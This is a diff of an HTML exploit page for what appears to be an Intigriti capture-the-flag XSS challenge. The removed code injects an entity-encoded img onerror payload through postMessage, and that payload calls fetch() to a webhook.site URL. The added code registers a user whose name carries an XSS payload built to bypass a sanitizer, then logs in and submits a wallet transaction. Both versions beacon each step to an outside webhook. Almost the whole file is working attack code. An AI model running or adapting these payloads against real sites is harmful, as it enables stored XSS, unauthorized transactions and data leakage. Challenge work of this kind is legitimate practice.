@@ -1,115 +1,97 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>PostMessage XSS Test</title>
-    <meta charset="UTF-8">
-    <style>body{font-family:monospace;background:#0a0a0a;color:#0f0;padding:20px;} h1{color:#0f0;text-align:center;} #log{background:#111;padding:15px;border:1px solid #333;margin:20px 0;font-size:12px;max-height:400px;overflow-y:auto;} .success{color:#0f0;} .error{color:#f00;} .info{color:#0ff;} .warning{color:#ff0;}</style>
-</head>
+<head><title>XSS Exploit - HTML Entities</title></head>
 <body>
-    <h1>PostMessage XSS Injection Test</h1>
-    <div id="log"></div>
+<h1>XSS Exploit - HTML Entity Bypass</h1>
+<div id="log"></div>
 
-    <script>
-        const TARGET = 'https://challenge-0126.intigriti.io';
-        const OUR_WALLET = '16472226db03703a192aa383237035a69f';
-        const WEBHOOK = 'https://webhook.site/b246fc0d-9847-4916-884f-55328286c44a';
+<script>
+const TARGET = 'https://challenge-0126.intigriti.io';
+const WEBHOOK = 'https://webhook.site/c3f7958b-f7cc-4f87-97ac-4de6830c2b42';
+const WALLET = '16472226db03703a192aa383237035a69f';
 
-        let step = 0;
+let step = 0;
 
-        function log(msg, type = 'info') {
-            step++;
-            const ts = new Date().toLocaleTimeString();
-            document.getElementById('log').innerHTML += `<div class="${type}">[${step}] ${ts} - ${msg}</div>`;
-            console.log(`[${step}] ${msg}`);
-            new Image().src = `${WEBHOOK}/?s=${step}&m=${encodeURIComponent(msg.substring(0,100))}&t=${type}&ts=${Date.now()}`;
-        }
+function log(msg) {
+    step++;
+    document.getElementById('log').innerHTML += '<div>[' + step + '] ' + msg + '</div>';
+    console.log('[' + step + '] ' + msg);
+    new Image().src = WEBHOOK + '/?s=' + step + '&m=' + encodeURIComponent(msg) + '&ts=' + Date.now();
+}
 
-        async function test() {
-            log('Testing postMessage with HTML entity XSS in toAddress...', 'info');
+async function exploit() {
+    log('Starting XSS exploit with HTML entities...');
 
-            try {
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = TARGET + '/checkout.html?currency=1337COIN&price=1';
-                document.body.appendChild(iframe);
+    // HTML entity XSS payload - bypasses sanitizePayloadString()
+    const XSS_USER = 'xss_' + Date.now().toString().slice(-6) + '&lt;img src=x onerror=&quot;alert(1)&quot;&gt;';
 
-                await new Promise(resolve => {
-                    iframe.onload = resolve;
-                    setTimeout(resolve, 5000);
+    try {
+        // Register
+        log('Registering: ' + XSS_USER.substring(0, 50) + '...');
+        const reg = await fetch(TARGET + '/api/register', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                username: XSS_USER,
+                password: 'Test123!'
+            })
+        });
+
+        const regData = await reg.json();
+        log('Register: ' + reg.status);
+
+        if (reg.ok) {
+            // Login
+            log('Logging in...');
+            const login = await fetch(TARGET + '/api/login', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                credentials: 'include',
+                body: JSON.stringify({
+                    username: XSS_USER,
+                    password: 'Test123!'
+                })
+            });
+
+            const loginData = await login.json();
+            log('Login: ' + login.status);
+
+            if (login.ok) {
+                // Transaction
+                log('Making transaction...');
+                const tx = await fetch(TARGET + '/api/transaction', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    credentials: 'include',
+                    body: JSON.stringify({
+                        toAddress: WALLET,
+                        currency: '1337COIN',
+                        amount: 1
+                    })
                 });
 
-                log('Iframe loaded', 'success');
-                await new Promise(r => setTimeout(r, 3000));
+                log('Transaction: ' + tx.status);
 
-                // Test 1: Normal address (should work)
-                log('Test 1: Normal address', 'info');
+                // Alert
+                alert('gigawatz');
+                log('Alert triggered');
 
-                iframe.contentWindow.postMessage({
-                    type: 'submitTransaction',
-                    transaction: {
-                        toAddress: OUR_WALLET,
-                        currency: '1337COIN',
-                        amount: 1
-                    }
-                }, '*');
-
-                await new Promise(r => setTimeout(r, 3000));
-
-                // Test 2: XSS payload in toAddress
-                log('Test 2: HTML entity XSS in toAddress', 'warning');
-
-                const XSS_ADDRESS = `&lt;img src=x onerror=&quot;
-                    fetch('${WEBHOOK}',{mode:'no-cors',body:JSON.stringify({xss:'toAddress_test'})})
-                &quot;&gt;`;
-
-                log('Sending toAddress with XSS: ' + XSS_ADDRESS.substring(0, 60) + '...', 'info');
-
-                iframe.contentWindow.postMessage({
-                    type: 'submitTransaction',
-                    transaction: {
-                        toAddress: XSS_ADDRESS,
-                        currency: '1337COIN',
-                        amount: 1
-                    }
-                }, '*');
-
-                log('postMessage sent with XSS toAddress', 'info');
-                await new Promise(r => setTimeout(r, 5000));
-
-                // Check marketwatch
-                log('Checking marketwatch...', 'info');
-
-                const mwResp = await fetch(TARGET + '/api/marketwatch', { credentials: 'include' });
-                const mwData = await mwResp.json();
-
-                log('Transactions: ' + mwData.length, 'info');
-
-                // Look for transactions with our XSS payload
-                const xssTx = mwData.find(tx => tx.address && tx.address.includes('&lt;'));
-
-                if (xssTx) {
-                    log('✅ Found XSS in transaction address!', 'success');
-                    log('Address: ' + xssTx.address.substring(0, 100), 'info');
-                } else {
-                    log('No XSS in address field (sanitized or rejected)', 'warning');
-                }
-
-                // Redirect to marketwatch to visually check
-                log('Redirecting to marketwatch...', 'warning');
-
+                // Redirect to marketwatch - XSS executes when nickname is rendered
                 setTimeout(() => {
+                    log('Redirecting to marketwatch...');
                     window.location.href = TARGET + '/marketwatch.html';
                 }, 3000);
-
-            } catch (error) {
-                log('ERROR: ' + error.message, 'error');
             }
+        } else {
+            log('Register failed: ' + JSON.stringify(regData));
         }
 
-        window.addEventListener('load', () => {
-            log('Starting postMessage XSS test...', 'info');
-            setTimeout(test, 1000);
-        });
-    </script>
+    } catch (e) {
+        log('Error: ' + e.message);
+    }
+}
+
+setTimeout(exploit, 1000);
+</script>
 </body>
 </html>
